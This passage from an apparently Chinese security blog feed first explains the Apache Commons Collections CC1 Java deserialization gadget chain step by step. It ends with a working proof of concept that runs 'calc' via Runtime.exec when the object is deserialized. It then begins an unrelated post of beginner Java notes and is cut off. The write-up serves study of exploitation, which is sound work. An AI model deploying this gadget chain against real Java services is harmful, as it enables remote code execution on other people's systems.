class="built_in">this</span>.map.entrySet());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>而这里调用的<code>isSetValueChecking()</code>是<code>transformedMap</code>自己的<code>isSetValueChecking()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">isSetValueChecking</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer != <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>往前调用<code>decorate()</code>方法时，<code>valueTransformer</code>被赋值为<code>invokerTransformer</code>，所以<code>isSetValueChecking()</code>会返回<code>true</code>，对应到<code>entrySet()</code>里就是返回包装后的<code>EntrySet</code>实例</p><p>在for-each循环中，会隐式调用这个自定义 <code>EntrySet</code> 的 <code>iterator()</code> 方法，该方法返回一个 <code>EntrySetIterator</code> 实例</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Iterator <span class="title function_">iterator</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EntrySetIterator</span>(<span class="built_in">this</span>.collection.iterator(), <span class="built_in">this</span>.parent);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>当<code>EntrySetIterator</code>尝试使用<code>next()</code>方法获取下一个元素时，该方法返回的是一个<code>MapEntry</code>类型的实例，这就是能拿到<code>MapEntry</code>的全过程</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">            Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry)<span class="built_in">this</span>.iterator.next();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MapEntry</span>(entry, <span class="built_in">this</span>.parent);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>这里返回的<code>MapEntry</code>的<code>parent</code>属性来源于<code>EntrySetIterator</code>的<code>parent</code>，而<code>EntrySetIterator</code>的<code>parent</code>来自于<code>EntrySet</code>的<code>parent</code>，<code>EntrySet</code>由<code>AbstractInputCheckedMapDecorator</code>类的<code>entrySet()</code>方法产生，在构建时给<code>parent</code>传递的就是<code>AbstractInputCheckedMapDecorator</code>类型，对应到链中，遍历由<code>transformedMap</code>发起，而<code>transformedMap</code>的类是<code>TransformedMap</code>，继承于<code>AbstractInputCheckedMapDecorator</code>类，所以最后<code>MapEntry</code>执行的<code>setValue()</code>实际就是<code>transformedMap.checkSetValue()</code></p><blockquote><p>如果单单知道遍历过程返回了一个MapEntry倒还好，但是要溯源这一整个过程属实很困难，其中涉及到很多继承关系和实现类与接口，完全的抽象，这很Java</p></blockquote><p>接下来继续寻找<code>setValue()</code>的上层，发现在<code>AnnotationInvocationHandler</code>类的<code>readObject()</code>方法中调用了<code>setValue()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var10 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var10.memberTypes();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(Map.Entry var5 : <span class="built_in">this</span>.memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">            <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var10.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里<code>var5</code>是从属性<code>this.memberValues</code>遍历出来的，跟我们先前的构造有异曲同工之妙，下面看<code>memberValues</code>是从构造器中被赋值的</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        Class[] var3 = var1.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">            <span class="built_in">this</span>.type = var1;</span><br><span class="line">            <span class="built_in">this</span>.memberValues = var2;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>但是<code>AnnotationInvocationHandler</code>类的修饰符是<code>default</code>，无法在包外调用，需要利用反射去实例化它</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Override.class,transformedMap)</span><br></pre></td></tr></table></figure><p>理论上直接往<code>var2</code>传<code>transformedMap</code>后面的<code>var5</code>就是需要的<code>MapEntry</code>，但是要执行到<code>var5.setValue()</code>还有两层if判断需要处理</p><blockquote><p>根据<code>String var6 = (String)var5.getKey()</code>，<code>var6</code>是从<code>this.memberValues</code>提取出的键名</p></blockquote><p>首先要求<code>var7</code>不为空。<code>var7</code>的来历是<code>var10 = AnnotationType.getInstance(this.type)</code> -&gt; <code>Map var3 = var10.memberTypes()</code> -&gt; <code>Class var7 = (Class)var3.get(var6)</code>，这里首先从<code>this.type</code>属性获得该注解类对应的、全局唯一的 <code>AnnotationType</code> 实例，再从该实例中获取一个Map，该Map存储了注解中每个成员的名字和该成员被定义的类型，再从Map中获取键为<code>var6</code>的值强转为Object赋给<code>var7</code>。而要求<code>var7</code>不为空，实际则指传入 <code>memberValues</code> 的键名，必须是目标注解中存在的成员名称</p><p>在<code>Action</code>注解中，有好几个成员</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Action &#123; </span><br><span class="line">    String <span class="title function_">input</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    String <span class="title function_">output</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    FaultAction[] fault() <span class="keyword">default</span> &#123; &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把先前<code>map.put(&quot;key&quot;, &quot;value&quot;)</code>中的<code>key</code>改为任意一个（如<code>input</code>）即可通过检查</p><p>第二层if判断，要求<code>var8</code>不是<code>var7</code>类型和<code>ExceptionProxy</code>类型的实例，这里的<code>var7</code>经过上面的强转是一个Class类型，<code>var8</code>从<code>Object var8 = var5.getValue()</code>而来，因为我选择了<code>Action</code>注解的<code>input</code>成员，此处把put过去的值变成数字就能通过了</p><p>通过if判断后，<code>setValue()</code>语句长这样</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var10.members().get(var6)));</span><br></pre></td></tr></table></figure><p>正常说，应该让<code>setValue()</code>的参数为<code>Runtime.getRuntime()</code>，而此处的参数被定义为了一长串无法控制的参数</p><p>实际上，执行<code>setValue()</code>的意义在于执行<code>checkSetValue()</code>，执行<code>checkSetValue()</code>的意义在于执行<code>transformedMap</code>中的<code>this.valueTransformer.transform()</code>，可以寻找一个类，让其执行<code>transform()</code>与参数无关，而正好有一个<code>ConstantTransformer</code>满足条件，它的<code>transform()</code>被方法重写为</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>返回值完全与<code>input</code>无关，直接返回了属性<code>iConstant</code>，该属性在构建时被赋值</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>但是这个类只能做到返回，不能去执行，还需要一个能够协调<code>ConstantTransformer</code>和<code>invokerTransformer</code>执行<code>transform()</code>方法的工具</p><p>在<code>ChainedTransformer</code>这个类中，其重写的<code>transform()</code>方法很有意思</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>iTransformers</code>是一个存储了<code>Transformer</code>对象的数组，在构建时被赋值</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>ChainedTransformer</code>的<code>transform()</code>方法从<code>iTransformers</code>数组中逐个遍历出<code>Transformer</code>对象并执行它们的<code>transform()</code>方法，并把上一个<code>transform()</code>方法执行完的返回值当作下一个<code>transform()</code>的参数</p><p>在构建transformer数组前还有一个问题，<code>Runtime</code>没有接入<code>Serializable</code>接口，不能被序列化。所以在构建transformer数组时执行的命令链应该是利用反射实例化<code>Runtime</code></p><p>如果<code>chainedTransformer</code>能构建出这样的<code>iTransformers</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),&#125;;</span><br></pre></td></tr></table></figure><p>将<code>chainedTransformer</code>作为<code>valueTransformer</code>执行<code>decorate()</code>，那么最后执行到<code>setValue()</code>时，无论在<code>setValue()</code>传入了什么，都会被第一步<code>ConstantTransformer</code>执行<code>transform()</code>固定返回<code>Runtime.class</code>覆盖，之后就是命令链条的执行</p><p>最后的反序列化链，执行自动触发计算器</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;input&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Action.class,transformedMap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser1.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;ser1.bin&quot;</span>)));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(filename)));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结一下，在链中，一个<code>AnnotationInvocationHandler</code>对象被反序列化，这会触发其<code>readObject()</code>方法，该方法对传入的<code>transformedMap</code>调用了<code>setValue()</code>方法，该方法又调用了<code>checkSetValue()</code>，<code>checkSetValue()</code>的执行又调用了<code>transformedMap</code>中的<code>this.valueTransformer.transform()</code>，实际上就是<code>chainedTransformer.transform()</code>，该方法第一层无视了参数，直接返回<code>Runtime.class</code>，之后的<code>transform()</code>通过链式执行造成了恶意命令触发</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">ois.readObject()</span><br><span class="line">└── AnnotationInvocationHandler.readObject()</span><br><span class="line">    ├── this.memberValues.entrySet()</span><br><span class="line">    │   └── (TransformedMap).entrySet()</span><br><span class="line">    │       └── AbstractInputCheckedMapDecorator.entrySet()</span><br><span class="line">    │           ├── this.isSetValueChecking()</span><br><span class="line">    │           │   └── (TransformedMap).isSetValueChecking()</span><br><span class="line">    │           └── new EntrySet(..., this) // 创建EntrySet</span><br><span class="line">    │</span><br><span class="line">    ├── EntrySet.iterator()</span><br><span class="line">    │   └── new EntrySetIterator(..., this.parent) // 创建迭代器，传递parent</span><br><span class="line">    │</span><br><span class="line">    └── for (Map.Entry var5 : ...) // 遍历循环</span><br><span class="line">        ├── EntrySetIterator.next()</span><br><span class="line">        │   └── new MapEntry(entry, this.parent)</span><br><span class="line">        │</span><br><span class="line">        ├── 类型检查逻辑 (var7 != null &amp;&amp; !var7.isInstance(var8))</span><br><span class="line">        │</span><br><span class="line">        └── MapEntry.setValue(AnnotationTypeMismatchExceptionProxy)</span><br><span class="line">            └── parent.checkSetValue(value)</span><br><span class="line">                └── (TransformedMap).checkSetValue()</span><br><span class="line">                    └── this.valueTransformer.transform(value) // 执行预设的Transformer链</span><br><span class="line">                        └── ChainedTransformer.transform()</span><br><span class="line">                            ├── ConstantTransformer.transform() // Runtime.class</span><br><span class="line">                            ├── InvokerTransformer.transform() // getMethod(&quot;getRuntime&quot;)</span><br><span class="line">                            ├── InvokerTransformer.transform() // invoke(null) Runtime</span><br><span class="line">                            └── InvokerTransformer.transform() // exec(&quot;calc&quot;)</span><br><span class="line">                                └── Runtime.getRuntime().exec(&quot;calc&quot;)</span><br></pre></td></tr></table></figure><br/>]]></content>
      
      
      <categories>
          
          <category> CTF相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java拾遗补阙</title>
      <link href="/2025/12/14/Java%E6%8B%BE%E9%81%97%E8%A1%A5%E9%98%99/"/>
      <url>/2025/12/14/Java%E6%8B%BE%E9%81%97%E8%A1%A5%E9%98%99/</url>
      
        <content type="html"><![CDATA[<h1 id="Java拾遗补阙"><a href="#Java拾遗补阙" class="headerlink" title="Java拾遗补阙"></a>Java拾遗补阙</h1><p>初学Java，第一次就被它冗长的语句所震撼，略有接触之后，当初的疑问不仅没有减少，反而有指数增加趋势。上大学之前几乎没有学习过任何一门编程语言，刚接触的语言是C，从现在看来当初晦涩的C真是言简意赅、优美至极。进入信安后再一次接触到了PHP和Python，这两位都是较为出名的面向对象的编程语言，但是极端程度在Java面前还是不值一提</p><p>学Java的驱动力在于想要搞懂Java反序列化，萌生出这个念头的原因在于当时PHP反序列化学得还算舒适，第一次看Java反序列化的exp简直是在看天书，之后几天网上找了些Java入门教程，然而越是学习，问题也越为频繁地出现。前摇有点过长了，此处汇总了一些学习Java过程的疑惑在经过漫长思考后的不成熟的理解方式，可能内容会很割裂，但也无妨反正是我自己看<code>:)</code></p><br/><h2 id="极端的面向对象"><a href="#极端的面向对象" class="headerlink" title="极端的面向对象"></a>极端的面向对象</h2><p>为什么说Java是非常极端的面向对象，因为直到我打字的这一刻，我还没有见到任何一行代码可以游离在类的外部执行，就连程序执行的入口<code>main</code>函数，也需要包装在一个类里面</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">================People类</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> JavaStudy.greet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">People</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">greet</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Chinese</span> <span class="keyword">extends</span> <span class="title class_">People</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">greet</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;你好&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">American</span>  <span class="keyword">extends</span> <span class="title class_">People</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">greet</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Korean</span>  <span class="keyword">extends</span> <span class="title class_">People</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">greet</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;안녕하세요&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">================Main类</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> JavaStudy.greet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">People</span> <span class="variable">Chinese</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Chinese</span>();</span><br><span class="line">        <span class="type">People</span> <span class="variable">American</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">American</span>();</span><br><span class="line">        <span class="type">People</span> <span class="variable">Korean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Korean</span>();</span><br><span class="line"></span><br><span class="line">        Chinese.greet();</span><br><span class="line">        American.greet();</span><br><span class="line">        Korean.greet();</span><br><span class="line">        System.out.println();</span><br><span class="line">        </span><br><span class="line">        People[] people = <span class="keyword">new</span>  <span class="title class_">People</span>[<span class="number">3</span>];</span><br><span class="line">        people[<span class="number">0</span>]=Chinese;</span><br><span class="line">        people[<span class="number">1</span>]=American;</span><br><span class="line">        people[<span class="number">2</span>]=Korean;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(People element:people)&#123;</span><br><span class="line">            element.greet();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果只能看到<code>main</code>函数的代码，几乎无法理解代码运行的逻辑，一般我们只能看到对象调用方法作为程序运行的主要方式，<code>main</code>函数此刻不再像C那么具体地负责每一个动作，而是一个调度器，协调多个对象调用它们的方法，并以此作为程序运行的单元</p><br/><h2 id="类型的声明与类型的转换"><a href="#类型的声明与类型的转换" class="headerlink" title="类型的声明与类型的转换"></a>类型的声明与类型的转换</h2><p>初学Java第一次看到实例化对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>;</span><br><span class="line"><span class="comment">//格式为 声明类型 对象名称 = new 实际类型</span></span><br></pre></td></tr></table></figure><p>而在PHP中，实例化一个对象长这样</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$dog</span> = <span class="keyword">new</span> <span class="title class_">Dog</span>;</span><br></pre></td></tr></table></figure><p>Java多出了一个称为声明类型的概念，刚开始不能理解其中的含义，而且起初声明类型大多与实际类型匹配，直到后面学到继承，出现了下面的声明语句</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Animal</span> <span class="variable">animal</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>;</span><br></pre></td></tr></table></figure><p>其中<code>Animal</code>是<code>Dog</code>的父类，这里我们声明了一个<code>Animal</code>类型的对象，但它的实际类型却是<code>Dog</code>，而由此则出现了类型转化的问题。倘若<code>Dog</code>类有一个特别的<code>bark</code>方法，我们是否能直接调用<code>animal.bark()</code>？答案是不行，我们声明的类型是<code>Animal</code>，编译器会从<code>Animal</code>类中寻找<code>bark</code>，但是<code>Animal</code>类中并没有定义该方法，所以会编译报错。但是，这里的<code>animal</code>对象实际上就是<code>Dog</code>类实例化出来的，利用向下转型可以让<code>animal</code>成为<code>Dog</code>类型，语法如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> (Dog) animal;</span><br></pre></td></tr></table></figure><p>之后我们就可以愉快地使用<code>dog.bark()</code>了</p><p>但是这样的转型是由有风险的，如果<code>animal</code>是<code>cat</code>的实例化怎么办？所以这就是为什么可以看到在进行强转时都会有一层if判断</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (animal <span class="keyword">instanceof</span> Dog) &#123;</span><br><span class="line">    <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> (Dog) animal;</span><br><span class="line">    dog.bark();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>既然有向下转型，那也有向上转型，但是向上转型通常不需要特别去声明，因为父类的方法在子类本来就已经继承好了，完全可以直接使用</p><blockquote><p>往往一个方法的返回值类型是确定的，比如返回的是通用的<code>Object</code>类型，但是我们若实际知道这是<code>Dog</code>类型且需要调用它，此时强转的重要性就更加凸显了</p></blockquote><br/><h2 id="利用反射修改私有成员"><a href="#利用反射修改私有成员" class="headerlink" title="利用反射修改私有成员"></a>利用反射修改私有成员</h2><p>利用反射我们可以在任何地方修改一个私有属性或私有方法，但使用它的代码也很复杂</p><p>定义一个<code>Person</code>类，里面放一些私有属性</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">testMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Test Success!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ReflectField类演示如何使用反射修改私有属性"><a 